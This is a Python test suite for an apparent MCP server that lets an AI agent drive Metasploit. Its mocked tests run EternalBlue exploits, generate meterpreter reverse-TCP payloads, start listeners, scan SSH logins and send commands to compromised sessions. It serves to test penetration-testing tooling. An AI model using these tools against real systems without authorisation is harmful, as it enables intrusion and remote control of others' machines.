#!/usr/bin/env python3
"""
Integration tests for MCP tools.
"""

import pytest
from unittest.mock import Mock, AsyncMock, patch
import asyncio

# Add the parent directory to the path so we can import modules
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from MetasploitMCP import (
    show_options,
    list_exploits,
    list_payloads,
    generate_payload,
    run_exploit,
    run_auxiliary_module,
    run_post_module,
    list_active_sessions,
    send_session_command,
    terminate_session,
    list_listeners,
    start_listener,
    stop_job,
    health_check
)


class TestShowOptions:
    """Test the show_options MCP tool."""
    
    @pytest.mark.asyncio
    async def test_show_options_with_payload(self):
        """Test show_options with both module and payload."""
        with patch('console_helpers.show_module_options_via_console', new_callable=AsyncMock) as mock_show:
            mock_show.return_value = {
                "status": "success",
                "formatted_output": "Module options:\n   Name    Current Setting  Required  Description",
                "module_name": "exploit/unix/ftp/proftpd_modcopy_exec",
                "payload_name": "linux/x86/meterpreter/reverse_tcp"
            }
            
            result = await show_options(
                module_name="exploit/unix/ftp/proftpd_modcopy_exec",
                module_type="exploit",
                payload_name="linux/x86/meterpreter/reverse_tcp"
            )
            
            assert result["status"] == "success"
            assert "Module options" in result["formatted_output"]
            mock_show.assert_called_once_with(
                "exploit/unix/ftp/proftpd_modcopy_exec", "exploit", "linux/x86/meterpreter/reverse_tcp"
            )
    
    @pytest.mark.asyncio
    async def test_show_options_module_only(self):
        """Test show_options with module only."""
        with patch('console_helpers.show_module_options_via_console', new_callable=AsyncMock) as mock_show:
            mock_show.return_value = {
                "status": "success",
                "formatted_output": "Module options:\n   Name    Current Setting  Required  Description",
                "module_name": "auxiliary/scanner/ssh/ssh_login",
                "payload_name": None
            }
            
            result = await show_options(
                module_name="auxiliary/scanner/ssh/ssh_login",
                module_type="auxiliary"
            )
            
            assert result["status"] == "success"
            assert result["payload_name"] is None
            mock_show.assert_called_once_with(
                "auxiliary/scanner/ssh/ssh_login", "auxiliary", None
            )


class TestListExploits:
    """Test the list_exploits MCP tool."""
    
    @pytest.mark.asyncio
    async def test_list_exploits_no_filter(self):
        """Test listing exploits without filter."""
        with patch('MetasploitMCP.get_msf_client') as mock_get_client:
            mock_client = Mock()
            mock_client.modules.exploits = [
                'windows/smb/ms17_010_eternalblue',
                'unix/ftp/vsftpd_234_backdoor',
                'windows/http/iis_webdav_upload_asp'
            ]
            mock_get_client.return_value = mock_client
            
            result = await list_exploits()
            
            assert result == [
                'windows/smb/ms17_010_eternalblue',
                'unix/ftp/vsftpd_234_backdoor',
                'windows/http/iis_webdav_upload_asp'
            ]
    
    @pytest.mark.asyncio
    async def test_list_exploits_with_filter(self):
        """Test listing exploits with search filter."""
        with patch('MetasploitMCP.get_msf_client') as mock_get_client:
            mock_client = Mock()
            mock_client.modules.exploits = [
                'windows/smb/ms17_010_eternalblue',
                'unix/ftp/vsftpd_234_backdoor',
                'windows/smb/ms08_067_netapi'
            ]
            mock_get_client.return_value = mock_client
            
            result = await list_exploits("smb")
            
            assert result == [
                'windows/smb/ms17_010_eternalblue',
                'windows/smb/ms08_067_netapi'
            ]


class TestListPayloads:
    """Test the list_payloads MCP tool."""
    
    @pytest.mark.asyncio
    async def test_list_payloads_no_filter(self):
        """Test listing payloads without filter."""
        with patch('MetasploitMCP.get_msf_client') as mock_get_client:
            mock_client = Mock()
            mock_client.modules.payloads = [
                'windows/meterpreter/reverse_tcp',
                'linux/x86/shell/reverse_tcp',
                'windows/shell/reverse_tcp'
            ]
            mock_get_client.return_value = mock_client
            
            result = await list_payloads()
            
            assert result == [
                'windows/meterpreter/reverse_tcp',
                'linux/x86/shell/reverse_tcp',
                'windows/shell/reverse_tcp'
            ]
    
    @pytest.mark.asyncio
    async def test_list_payloads_with_platform_filter(self):
        """Test listing payloads with platform filter."""
        with patch('MetasploitMCP.get_msf_client') as mock_get_client:
            mock_client = Mock()
            mock_client.modules.payloads = [
                'windows/meterpreter/reverse_tcp',
                'linux/x86/shell/reverse_tcp',
                'windows/shell/reverse_tcp'
            ]
            mock_get_client.return_value = mock_client
            
            result = await list_payloads(platform="windows")
            
            assert result == [
                'windows/meterpreter/reverse_tcp',
                'windows/shell/reverse_tcp'
            ]


class TestGeneratePayload:
    """Test the generate_payload MCP tool."""
    
    @pytest.mark.asyncio
    async def test_generate_payload_success(self):
        """Test successful payload generation."""
        with patch('MetasploitMCP.get_msf_client') as mock_get_client:
            mock_client = Mock()
            mock_payload = Mock()
            mock_payload.payload_generate.return_value = b"fake_payload_data"
            mock_client.modules.use.return_value = mock_payload
            mock_get_client.return_value = mock_client
            
            with patch('MetasploitMCP.os.makedirs'):
                with patch('builtins.open', create=True) as mock_open:
                    mock_file = Mock()
                    mock_file.write = Mock()
                    mock_open.return_value.__enter__.return_value = mock_file
                    
                    result = await generate_payload(
                        payload_type="windows/meterpreter/reverse_tcp",
                        format_type="exe",
                        options={"LHOST": "192.168.1.100", "LPORT": 4444}
                    )
                    
                    assert result["status"] == "success"
                    assert "payload" in result["message"].lower()


class TestRunExploit:
    """Test the run_exploit MCP tool."""
    
    @pytest.mark.asyncio
    async def test_run_exploit_rpc_mode(self):
        """Test running exploit in RPC mode."""
        with patch('MetasploitMCP._execute_module_rpc') as mock_rpc:
            mock_rpc.return_value = {
                "status": "success",
                "job_id": 123,
                "message": "Exploit started"
            }
            
            result = await run_exploit(
                module_name="windows/smb/ms17_010_eternalblue",
                options={"RHOSTS": "192.168.1.1"},
                payload_name="windows/meterpreter/reverse_tcp",
                payload_options={"LHOST": "192.168.1.100", "LPORT": 4444},
                run_as_job=True
            )
            
            assert result["status"] == "success"
            assert result["job_id"] == 123
            mock_rpc.assert_called_once()
    
    @pytest.mark.asyncio
    async def test_run_exploit_console_mode(self):
        """Test running exploit in console mode."""
        with patch('MetasploitMCP._execute_module_console') as mock_console:
            mock_console.return_value = {
                "status": "success",
                "session_id": 1,
                "module_output": "Session 1 opened"
            }
            
            result = await run_exploit(
                module_name="windows/smb/ms17_010_eternalblue",
                options={"RHOSTS": "192.168.1.1"},
                payload_name="windows/meterpreter/reverse_tcp",
                payload_options={"LHOST": "192.168.1.100", "LPORT": 4444},
                run_as_job=False
            )
            
            assert result["status"] == "success"
            assert result["session_id"] == 1
            mock_console.assert_called_once()


class TestRunAuxiliaryModule:
    """Test the run_auxiliary_module MCP tool."""
    
    @pytest.mark.asyncio
    async def test_run_auxiliary_rpc_mode(self):
        """Test running auxiliary module in RPC mode."""
        with patch('MetasploitMCP._execute_module_rpc') as mock_rpc:
            mock_rpc.return_value = {
                "status": "success",
                "job_id": 456,
                "message": "Auxiliary module started"
            }
            
            result = await run_auxiliary_module(
                module_name="scanner/ssh/ssh_login",
                options={"RHOSTS": "192.168.1.0/24", "USERNAME": "admin"},
                run_as_job=True
            )
            
            assert result["status"] == "success"
            assert result["job_id"] == 456
            mock_rpc.assert_called_once()
    
    @pytest.mark.asyncio
    async def test_run_auxiliary_console_mode(self):
        """Test running auxiliary module in console mode."""
        with patch('MetasploitMCP._execute_module_console') as mock_console:
            mock_console.return_value = {
                "status": "success",
                "module_output": "Scan completed"
            }
            
            result = await run_auxiliary_module(
                module_name="scanner/ssh/ssh_login",
                options={"RHOSTS": "192.168.1.1", "USERNAME": "admin"},
                run_as_job=False
            )
            
            assert result["status"] == "success"
            assert "Scan completed" in result["module_output"]
            mock_console.assert_called_once()


class TestRunPostModule:
    """Test the run_post_module MCP tool."""
    
    @pytest.mark.asyncio
    async def test_run_post_module_rpc_mode(self):
        """Test running post module in RPC mode."""
        with patch('MetasploitMCP._execute_module_rpc') as mock_rpc:
            mock_rpc.return_value = {
                "status": "success",
                "job_id": 789,
                "message": "Post module started"
            }
            
            result = await run_post_module(
                module_name="windows/gather/enum_shares",
                session_id=1,
                options={"SMBUser": "admin"},
                run_as_job=True
            )
            
            assert result["status"] == "success"
            assert result["job_id"] == 789
            mock_rpc.assert_called_once()
    
    @pytest.mark.asyncio
    async def test_run_post_module_console_mode(self):
        """Test running post module in console mode."""
        with patch('MetasploitMCP._execute_module_console') as mock_console:
            mock_console.return_value = {
                "status": "success",
                "module_output": "Post module completed"
            }
            
            result = await run_post_module(
                module_name="windows/gather/enum_shares",
                session_id=1,
                options={"SMBUser": "admin"},
                run_as_job=False
            )
            
            assert result["status"] == "success"
            assert "Post module completed" in result["module_output"]
            mock_console.assert_called_once()


class TestListActiveSessions:
    """Test the list_active_sessions MCP tool."""
    
    @pytest.mark.asyncio
    async def test_list_active_sessions(self):
        """Test listing active sessions."""
        with patch('MetasploitMCP.get_msf_client') as mock_get_client:
            mock_client = Mock()
            mock_client.sessions.list = {
                "1": {"type": "meterpreter", "tunnel_peer": "192.168.1.100:4444"},
                "2": {"type": "shell", "tunnel_peer": "192.168.1.101:4445"}
            }
            mock_get_client.return_value = mock_client
            
            result = await list_active_sessions()
            
            assert result["status"] == "success"
            assert len(result["sessions"]) == 2
            assert "1" in result["sessions"]
            assert "2" in result["sessions"]


class TestSendSessionCommand:
    """Test the send_session_command MCP tool."""
    
    @pytest.mark.asyncio
    async def test_send_session_command_success(self):
        """Test successful session command."""
        with patch('MetasploitMCP.get_msf_client') as mock_get_client:
            mock_client = Mock()
            mock_client.sessions.list = {"1": {"type": "meterpreter"}}
            mock_session = Mock()
            mock_session.read.return_value = "Command output"
            mock_client.sessions.session.return_value = mock_session
            mock_get_client.return_value = mock_client
            
            result = await send_session_command(1, "sysinfo")
            
            assert result["status"] == "success"
            assert "Command output" in result["output"]


class TestTerminateSession:
    """Test the terminate_session MCP tool."""
    
    @pytest.mark.asyncio
    async def test_terminate_session_success(self):
        """Test successful session termination."""
        with patch('MetasploitMCP.get_msf_client') as mock_get_client:
            mock_client = Mock()
            mock_client.sessions.list = {"1": {"type": "meterpreter"}}
            mock_session = Mock()
            mock_client.sessions.session.return_value = mock_session
            mock_get_client.return_value = mock_client
            
            result = await terminate_session(1)
            
            assert result["status"] == "success"
            assert "terminated" in result["message"].lower()


class TestListListeners:
    """Test the list_listeners MCP tool."""
    
    @pytest.mark.asyncio
    async def test_list_listeners(self):
        """Test listing listeners."""
        with patch('MetasploitMCP.get_msf_client') as mock_get_client:
            mock_client = Mock()
            mock_client.jobs.list = {
                "123": {"name": "Handler Job", "datastore": {"LHOST": "192.168.1.100"}},
                "456": {"name": "Other Job", "datastore": {}}
            }
            mock_get_client.return_value = mock_client
            
            result = await list_listeners()
            
            assert result["status"] == "success"
            assert result["handler_count"] == 1
            assert result["other_job_count"] == 1


class TestStartListener:
    """Test the start_listener MCP tool."""
    
    @pytest.mark.asyncio
    async def test_start_listener_success(self):
        """Test successful listener start."""
        with patch('MetasploitMCP._execute_module_rpc') as mock_rpc:
            mock_rpc.return_value = {
                "status": "success",
                "job_id": 999,
                "message": "Listener started"
            }
            
            result = await start_listener(
                payload_type="windows/meterpreter/reverse_tcp",
                lhost="192.168.1.100",
                lport=4444
            )
            
            assert result["status"] == "success"
            assert result["job_id"] == 999
            mock_rpc.assert_called_once()


class TestStopJob:
    """Test the stop_job MCP tool."""
    
    @pytest.mark.asyncio
    async def test_stop_job_success(self):
        """Test successful job stop."""
        with patch('MetasploitMCP.get_msf_client') as mock_get_client:
            mock_client = Mock()
            mock_client.jobs.list = {"123": {"name": "Test Job"}}
            mock_client.jobs.stop.return_value = "stopped"
            mock_get_client.return_value = mock_client
            
            result = await stop_job(123)
            
            assert result["status"] == "success"
            assert "stopped" in result["message"].lower()


class TestHealthCheck:
    """Test the health_check MCP tool."""
    
    @pytest.mark.asyncio
    async def test_health_check_success(self):
        """Test successful health check."""
        with patch('MetasploitMCP.get_msf_client') as mock_get_client:
            mock_client = Mock()
            mock_client.core.version = {"version": "6.0.0"}
            mock_get_client.return_value = mock_client
            
            result = await health_check()
            
            assert result["status"] == "success"
            assert "6.0.0" in result["message"]
